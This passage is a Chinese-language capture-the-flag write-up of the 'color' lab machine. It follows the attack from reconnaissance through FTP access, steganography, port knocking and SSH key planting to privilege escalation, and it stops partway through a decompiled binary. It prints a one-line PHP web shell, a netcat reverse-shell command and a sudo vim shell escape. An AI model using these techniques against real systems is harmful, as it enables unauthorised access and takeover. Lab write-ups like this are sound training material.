192.168.56.100  08:00:27:7c:fb:bb       PCS Systemtechnik GmbH
192.168.56.183  08:00:27:19:77:3e       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.933 seconds (132.44 hosts&#x2F;sec). 3 responded</code></pre>

<h2 id="mission-txt"><a href="#mission-txt" class="headerlink" title="mission.txt"></a>mission.txt</h2><blockquote>
<p>Hey hacker, I’ve heard a lot about you and I’ve been told you’re good. </p>
</blockquote>
<blockquote>
<p>The FBI has hacked into my apache server and shut down my website. I need you to sneak in and retrieve the “root.txt” file. I left my credentials somewhere but I can’t remember where.</p>
</blockquote>
<blockquote>
<p>I will pay you well if you succeed, good luck hacker.</p>
</blockquote>
<p>FBI黑进了它的apace服务器，然后给我们留下了credentials，但是不知道在哪。</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; nmap 192.168.56.183 -sV -A 
Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-06-11 19:25 CST
Nmap scan report for 192.168.56.183
Host is up (0.00027s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21&#x2F;tcp open     ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.104
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1127     1127            0 Jan 27  2023 first
| -rw-r--r--    1 1039     1039            0 Jan 27  2023 second
| -rw-r--r--    1 0        0          290187 Feb 11  2023 secret.jpg
|_-rw-r--r--    1 1081     1081            0 Jan 27  2023 third
22&#x2F;tcp filtered ssh
80&#x2F;tcp open     http    Apache httpd 2.4.54 ((Debian))
|_http-title: Document
|_http-server-header: Apache&#x2F;2.4.54 (Debian)
MAC Address: 08:00:27:19:77:3E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:&#x2F;o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.5
Network Distance: 1 hop
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 192.168.56.183

OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
Nmap done: 1 IP address (1 host up) scanned in 8.36 seconds</code></pre>
<p>开放了21 22 80三个端口，并且21端口允许匿名登录，22端口被过滤了，看了不能ssh直连了,可能需要knock</p>
<h2 id="ftp匿名登录"><a href="#ftp匿名登录" class="headerlink" title="ftp匿名登录"></a>ftp匿名登录</h2><pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; ftp 192.168.56.183
Connected to 192.168.56.183.
220 (vsFTPd 3.0.3)
Name (192.168.56.183:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -al
229 Entering Extended Passive Mode (|||35554|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Feb 20  2023 .
drwxr-xr-x    2 0        0            4096 Feb 20  2023 ..
-rw-r--r--    1 1127     1127            0 Jan 27  2023 first
-rw-r--r--    1 1039     1039            0 Jan 27  2023 second
-rw-r--r--    1 0        0          290187 Feb 11  2023 secret.jpg
-rw-r--r--    1 1081     1081            0 Jan 27  2023 third
226 Directory send OK.
ftp&gt; </code></pre>
<p>first，second，third都是空的，不知道是什么玩意<br>有个图片<code>secret.jpg</code>,get下来看看<br><img src="https://ooo.0x0.ooo/2024/06/11/OJXmsX.png" alt="OJXmsX.png" loading="lazy"><br>很难让人怀疑不是隐写啊，用stegseek，没想到直接有东西</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; stegseek secret.jpg             
StegSeek 0.6 - https:&#x2F;&#x2F;github.com&#x2F;RickdeJager&#x2F;StegSeek

[i] Found passphrase: &quot;Nevermind&quot;        
[i] Original filename: &quot;more_secret.txt&quot;.
[i] Extracting to &quot;secret.jpg.out&quot;.


 ~&#x2F;Desktop&#x2F;colors                                                                                                                                                                                                        root@kali2  19:30:28 
&gt; cat secret.jpg.out 
&lt;-MnkFEo!SARTV#+D,Y4D&#39;3_7G9D0LFWbmBCht5&#39;AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)&lt;BOr&lt;.BPD?sF!,R&lt;@&lt;&lt;W;Dfm15Bk2*&#x2F;F&lt;G+4+EV:*DBND6+EV:.+E).&#x2F;F!,aHFWb4&#x2F;A0&gt;E$&#x2F;g+)2+EV:;Dg*&#x3D;BAnE0-BOr;qDg-#3DImlA+B)]_C&#96;m&#x2F;1@&lt;iu-Ec5e;FD,5.F(&amp;Zl+D&gt;2(@W-9&gt;+@BRZ@q[!,BOr&lt;.Ea&#96;Ki+EqO;A9&#x2F;l-DBO4CF&#96;JUG@;0P!&#x2F;g*T-E,9H5AM,)nEb&#x2F;Zr&#x2F;g*PrF(9-3ATBC1E+s3*3&#96;&#39;O.CG^*&#x2F;BkJ\:</code></pre>
<p>这堆东西认不出来开是什么，上了一手cyber chef，原来是base85<br><img src="https://ooo.0x0.ooo/2024/06/11/OJXJot.png" alt="OJXJot.png" loading="lazy"></p>
<pre class="language-none"><code class="language-none">Twenty years from now you will be more disappointed by&lt;­he things that you didn&#39;t do than by the ones you did do. So throw off the bowlines. Sail away from the safe harbor. Catch the trade winds in your sails. Explore. Dream. Discover.
pink:Pink4sPig$$</code></pre>
<p>貌似是<code>pink</code>用户的密码是<code>Pink4sPig$$</code><br>想用ssh连接，但是22被过滤了，想到之前做的一个靶机用的knock敲开,但是需要三个端口，想到前面有first，second，third可能对应三个端口1127 1039 1081</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> ~/Desktop/colors                                                                                                                                                                                                   17s  root@kali2  <span class="token number">19</span>:59:42 
<span class="token operator">></span> knock <span class="token number">192.168</span>.56.183 <span class="token number">1127</span> <span class="token number">1039</span> <span class="token number">1081</span>   
<span class="token operator">></span> nmap <span class="token number">192.168</span>.56.183
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-11 <span class="token number">20</span>:01 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.183
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00012s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:19:77:3E <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.12</span> seconds
</code></pre>
<p>22端口被敲开了!</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa pink@192.168.56.183
Warning: Identity <span class="token function">file</span> id_rsa not accessible: No such <span class="token function">file</span> or directory.
pink@192.168.56.183: Permission denied <span class="token punctuation">(</span>publickey<span class="token punctuation">)</span>.</code></pre>
<p>貌似没有公钥<br>去web看一下</p>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><p><img src="https://ooo.0x0.ooo/2024/06/11/OJXPrx.png" alt="OJXPrx.png" loading="lazy"><br>FBI…<br>忘了，网站被FBI黑了</p>
<h2 id="ftp再登录"><a href="#ftp再登录" class="headerlink" title="ftp再登录"></a>ftp再登录</h2><p>没有web只能再尝试登录ftp，发现登录用pink用户登录成功</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ftp</span> <span class="token number">192.168</span>.56.183     
Connected to <span class="token number">192.168</span>.56.183.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.3<span class="token punctuation">)</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.56.183:root<span class="token punctuation">)</span>: pink
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">41329</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="token number">6</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">6</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
drwx------    <span class="token number">2</span> <span class="token number">1127</span>     <span class="token number">1127</span>         <span class="token number">4096</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> green
drwx------    <span class="token number">3</span> <span class="token number">1000</span>     <span class="token number">1000</span>         <span class="token number">4096</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> pink
drwx------    <span class="token number">2</span> <span class="token number">1081</span>     <span class="token number">1081</span>         <span class="token number">4096</span> Feb <span class="token number">20</span>  <span class="token number">2023</span> purple
drwx------    <span class="token number">2</span> <span class="token number">1039</span>     <span class="token number">1039</span>         <span class="token number">4096</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> red
<span class="token number">226</span> Directory send OK.</code></pre>
<p>只有pink目录能进去</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">22024</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwx------    <span class="token number">3</span> <span class="token number">1000</span>     <span class="token number">1000</span>         <span class="token number">4096</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">6</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>            <span class="token number">9</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rwx------    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>          <span class="token number">220</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> .bash_logout
-rwx------    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>         <span class="token number">3526</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> .bashrc
-rwx------    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>          <span class="token number">807</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> .profile
drwx------    <span class="token number">2</span> <span class="token number">1000</span>     <span class="token number">1000</span>         <span class="token number">4096</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> .ssh
-rwx------    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>         <span class="token number">3705</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> .viminfo
-rw-r--r--    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>           <span class="token number">23</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> note.txt
<span class="token number">226</span> Directory send OK.</code></pre>
<p>看起来向用户目录，.ssh目录为空有个note，get下来看一下</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; cat note.txt      
nothing to see here...</code></pre>
<p>tmd。尝试传一下公钥，用私钥连接</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">ftp&gt; put id_rsa.pub 
local: id_rsa.pub remote: id_rsa.pub
229 Entering Extended Passive Mode (|||21951|)
150 Ok to send data.
100% |**************************************************************************************************************************************************************************************************|   564        8.27 MiB&#x2F;s    00:00 ETA
226 Transfer complete.
564 bytes sent in 00:00 (864.64 KiB&#x2F;s)</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ftp<span class="token operator">></span> put authorized_keys 
local: authorized_keys remote: authorized_keys
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">49340</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Ok to send data.
<span class="token number">100</span>% <span class="token operator">|</span>**************************************************************************************************************************************************************************************************<span class="token operator">|</span>   <span class="token number">564</span>        <span class="token number">8.40</span> MiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">564</span> bytes sent <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">997.79</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">7278</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwx------    <span class="token number">2</span> <span class="token number">1000</span>     <span class="token number">1000</span>         <span class="token number">4096</span> Jun <span class="token number">11</span> <span class="token number">14</span>:10 <span class="token builtin class-name">.</span>
drwx------    <span class="token number">3</span> <span class="token number">1000</span>     <span class="token number">1000</span>         <span class="token number">4096</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-------    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>          <span class="token number">564</span> Jun <span class="token number">11</span> <span class="token number">14</span>:10 authorized_keys
-rw-------    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>         <span class="token number">2635</span> Jun <span class="token number">11</span> <span class="token number">14</span>:06 id_rsa
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> <span class="token function">chmod</span> <span class="token number">644</span> authorized_keys
<span class="token number">200</span> SITE CHMOD <span class="token builtin class-name">command</span> ok.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"> ~/Desktop/colors                                                                                                                                                                                                        root@kali2  <span class="token number">20</span>:11:43 
<span class="token operator">></span> <span class="token function">chmod</span> <span class="token number">600</span> id_rsa 

 ~/Desktop/colors                                                                                                                                                                                                        root@kali2  <span class="token number">20</span>:11:47 
<span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa pink@192.168.56.183
Enter passphrase <span class="token keyword">for</span> key <span class="token string">'id_rsa'</span><span class="token builtin class-name">:</span> 
Linux color <span class="token number">5.10</span>.0-21-amd64 <span class="token comment">#1 SMP Debian 5.10.162-1 (2023-01-21) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun <span class="token number">11</span> <span class="token number">14</span>:10:47 <span class="token number">2024</span> from <span class="token number">192.168</span>.56.104
pink@color:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pink<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pink<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pink<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,108<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,112<span class="token punctuation">(</span>bluetooth<span class="token punctuation">)</span></code></pre>
<p>拿到shell</p>
<h2 id="降权www-data"><a href="#降权www-data" class="headerlink" title="降权www-data"></a>降权www-data</h2><pre class="language-bash" data-language="bash"><code class="language-bash">pink@color:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /home
total <span class="token number">24</span>
drwxr-xr-x  <span class="token number">6</span> root   root   <span class="token number">4096</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">19</span> root   root   <span class="token number">4096</span> Feb <span class="token number">20</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
drwx------  <span class="token number">2</span> green  green  <span class="token number">4096</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> green
drwx------  <span class="token number">3</span> pink   pink   <span class="token number">4096</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> pink
drwx------  <span class="token number">2</span> purple purple <span class="token number">4096</span> Feb <span class="token number">20</span>  <span class="token number">2023</span> purple
drwx------  <span class="token number">2</span> red    red    <span class="token number">4096</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> red</code></pre>
<p>home下有四个用户，不过其他三个都进不去<br>看一下这个.viminfo</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> /var/www/html/a.php
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>

        *       <span class="token number">1718108710</span>      <span class="token number">0</span>
        <span class="token string">"       1       13
        ^       1       14
        .       1       3
        +       1       3

> /var/www/html/sh.php
        *       1676139492      0
        "</span>       <span class="token number">1</span>       <span class="token number">28</span>
        ^       <span class="token number">1</span>       <span class="token number">29</span>
        <span class="token builtin class-name">.</span>       <span class="token number">1</span>       <span class="token number">28</span>
        +       <span class="token number">1</span>       <span class="token number">28</span></code></pre>
<p>注意到pink用户再www下有编辑文件的权限，尝试把权限降到www-data看下能不能再提到其他用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pink@color:/var/www/html$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">832</span>
drwxrwxrwx <span class="token number">2</span> www-data www-data   <span class="token number">4096</span> Jun <span class="token number">11</span> <span class="token number">14</span>:25 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root     root       <span class="token number">4096</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> pink     pink         <span class="token number">15</span> Jun <span class="token number">11</span> <span class="token number">14</span>:25 a.php
-rw-r--r-- <span class="token number">1</span> www-data www-data    <span class="token number">295</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> index.html
-rw-r--r-- <span class="token number">1</span> www-data www-data  <span class="token number">10701</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> index.html.bak
-rw-r--r-- <span class="token number">1</span> www-data www-data <span class="token number">821574</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> seized.png
pink@color:/var/www/html$ <span class="token function">cat</span> a.php
<span class="token operator">&lt;</span>?<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$_GET<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token variable">`</span></span><span class="token punctuation">;</span>
pink@color:/var/www/html$ <span class="token function">curl</span> http://127.0.0.1/a.php?1<span class="token operator">=</span>id
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>
pink@color:/var/www/html$ <span class="token function">curl</span> http://127.0.0.1/a.php?1<span class="token operator">=</span>nc+-e+/bin/bash+192.168.56.104+4567</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"> ~/Desktop/colors                                                                                                                                                                                                22m 1s  root@kali2  <span class="token number">20</span>:25:21 
<span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">4567</span>                
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.183<span class="token punctuation">]</span> <span class="token number">51834</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>
<p>拿到了www-data权限</p>
<h2 id="提权green"><a href="#提权green" class="headerlink" title="提权green"></a>提权green</h2><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@color:/var/www/html$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on color:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User www-data may run the following commands on color:
    <span class="token punctuation">(</span>green<span class="token punctuation">)</span> NOPASSWD: /usr/bin/vim</code></pre>
<p>好家伙，果然可以sudo,简单vim提权拿到green权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
:<span class="token operator">!</span>bash
green@color:/var/www/html$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1127</span><span class="token punctuation">(</span>green<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1127</span><span class="token punctuation">(</span>green<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1127</span><span class="token punctuation">(</span>green<span class="token punctuation">)</span></code></pre>
<h2 id="提权purple"><a href="#提权purple" class="headerlink" title="提权purple"></a>提权purple</h2><pre class="language-bash" data-language="bash"><code class="language-bash">green@color:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">44</span>
drwx------ <span class="token number">2</span> green green  <span class="token number">4096</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">6</span> root  root   <span class="token number">4096</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root  root      <span class="token number">9</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rwx------ <span class="token number">1</span> green green   <span class="token number">220</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> .bash_logout
-rwx------ <span class="token number">1</span> green green  <span class="token number">3526</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> .bashrc
-rwx------ <span class="token number">1</span> green green   <span class="token number">807</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> .profile
-rw-r--r-- <span class="token number">1</span> root  root    <span class="token number">145</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> note.txt
-rwxr-xr-x <span class="token number">1</span> root  root  <span class="token number">16928</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> test_4_green
green@color:~$ <span class="token function">cat</span> note.txt 
You<span class="token string">'ve been working very well lately Green, so I'</span>m going to give you one last test. If you pass it I'll give you the password <span class="token keyword">for</span> purple.

<span class="token parameter variable">-root</span></code></pre>
<p>这个提示感觉没什么用<br>注意到有一个文件<code>test_4_green</code><br>反编译看一下<br><img src="https://ooo.0x0.ooo/2024/06/11/OJXRGj.png" alt="OJXRGj.png" loading="lazy"></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">452</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-1D0h] BYREF</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+1C4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+1C8h] [rbp-8h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1CCh] [rbp-4h]</span>

  v3 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">srand</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">1000000</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Guess the number im thinking: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">==</span> v7 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Correct!! Here is the pass:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">qmemcpy</span><span class="token punctuation">(</span>
      v6<span class="token punctuation">,</span>
      <span class="token string">"FuprpRblcTzeg5JDNNasqeWKpFHvms4rMgrpAFYj5Zngqgvl7jK0iPpViDReY6nognFSGKtS4zTEiVPgzDXnPj06WsScYlt0EFryMGvP8SjVsg9Yjm"</span>
      <span class="token string">"xTeHkXUdzliZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqaCv2pZnGJ7L8e6DCsDPjNvjkVYR3W"</span>
      <span class="token string">"iRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKhaAWAR7kxJC8METsFLehuWd43P8kj2z2uyE"</span>
      <span class="token string">"BDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23haAWAR7kxJC8METFFLehuWd43P8kj2z2uyEBDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23"</span><span class="token punctuation">,</span>
      <span class="token number">445</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">&lt;=</span> <span class="token number">12</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v4 <span class="token operator">=</span> <span class="token function">lucas</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">putchar</span><span class="token punctuation">(</span>v6<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
